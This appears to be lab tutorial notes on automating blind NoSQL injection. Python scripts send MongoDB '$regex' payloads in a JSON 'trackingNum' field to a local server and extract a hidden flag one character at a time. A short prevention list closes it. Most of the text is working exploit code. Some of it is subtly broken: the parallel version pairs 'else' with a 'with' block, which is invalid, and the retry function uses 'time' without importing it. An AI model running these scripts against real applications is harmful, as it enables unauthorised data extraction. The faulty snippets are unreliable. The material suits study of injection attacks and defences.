# Automating Blind Data Extraction

Manually extracting data via blind injection gets tedious very quickly. Luckily, it is very easily automated using Python scripts.

## Oracle Function

Create a function that queries the application and returns true/false based on response:

```python
import requests
import json

def oracle(t):
    r = requests.post(
        "http://127.0.0.1/index.php",
        headers = {"Content-Type": "application/json"},
        data = json.dumps({"trackingNum": t})
    )
    return "bmdyy" in r.text  # Target indicator in response
```

## Verification

Test the oracle function with known values:

```python
# Make sure the oracle is functioning correctly
assert (oracle("X") == False)  # Known non-existent value
assert (oracle({"$regex": "^HTB{.*"}) == True)  # Known pattern
```

## Automated Extraction

### Basic Character-by-Character Extraction

```python
def extract_data():
    extracted = ""
    characters = "0123456789abcdef"  # Known character set
    
    while True:
        found = False
        for c in characters:
            test_regex = f"^{extracted}{c}.*"
            if oracle({"$regex": test_regex}):
                extracted += c
                found = True
                print(f"Found: {extracted}")
                break
        
        if not found:
            break
    
    return extracted
```

### Optimized Extraction (Known Format)

When you know the format (e.g., `HTB{[0-9a-f]{32}}`):

```python
def extract_htb_flag():
    trackingNum = "HTB{"  # Known prefix
    
    for _ in range(32):  # 32 hex characters
        for c in "0123456789abcdef":
            if oracle({"$regex": "^" + trackingNum + c}):
                trackingNum += c
                break
    
    trackingNum += "}"  # Known suffix
    return trackingNum
```

## Complete Script Example

```python
#!/usr/bin/python3

import requests
import json

def oracle(t):
    r = requests.post(
        "http://127.0.0.1/index.php",
        headers = {"Content-Type": "application/json"},
        data = json.dumps({"trackingNum": t})
    )
    return "bmdyy" in r.text

# Verify oracle works
assert (oracle("X") == False)
assert (oracle({"$regex": "^HTB{.*"}) == True)

# Extract tracking number
trackingNum = "HTB{"
for _ in range(32):
    for c in "0123456789abcdef":
        if oracle({"$regex": "^" + trackingNum + c}):
            trackingNum += c
            break
trackingNum += "}"

# Verify result
assert (oracle(trackingNum) == True)
print("Tracking Number: " + trackingNum)
```

## Performance Optimization

### Character Set Reduction

- **Known format**: Limit to specific characters (0-9a-f for hex)
- **Case sensitivity**: Test both uppercase and lowercase
- **Special characters**: Include based on application context

### Parallel Processing

```python
import concurrent.futures
import threading

def test_character(extracted, char):
    test_regex = f"^{extracted}{char}.*"
    return char if oracle({"$regex": test_regex}) else None

def extract_parallel():
    extracted = ""
    characters = "0123456789abcdef"
    
    while True:
        with concurrent.futures.ThreadPoolExecutor() as executor:
            futures = [executor.submit(test_character, extracted, c) 
                      for c in characters]
            
            for future in concurrent.futures.as_completed(futures):
                result = future.result()
                if result:
                    extracted += result
                    print(f"Found: {extracted}")
                    break
        else:
            break
    
    return extracted
```

## Error Handling

```python
def robust_oracle(t, max_retries=3):
    for attempt in range(max_retries):
        try:
            r = requests.post(
                "http://127.0.0.1/index.php",
                headers = {"Content-Type": "application/json"},
                data = json.dumps({"trackingNum": t}),
                timeout=10
            )
            return "bmdyy" in r.text
        except requests.RequestException as e:
            print(f"Attempt {attempt + 1} failed: {e}")
            if attempt == max_retries - 1:
                raise
            time.sleep(1)
```

## Key Points

- **Oracle function**: Central function to test queries
- **Verification**: Always test with known values first
- **Character sets**: Optimize based on expected format
- **Error handling**: Implement retries and timeouts
- **Progress tracking**: Print progress for long extractions
- **Performance**: Use parallel processing for large character sets

## Prevention

- Implement rate limiting to prevent automated attacks
- Monitor for suspicious query patterns
- Use input validation and parameterized queries
- Log and alert on repeated failed attempts
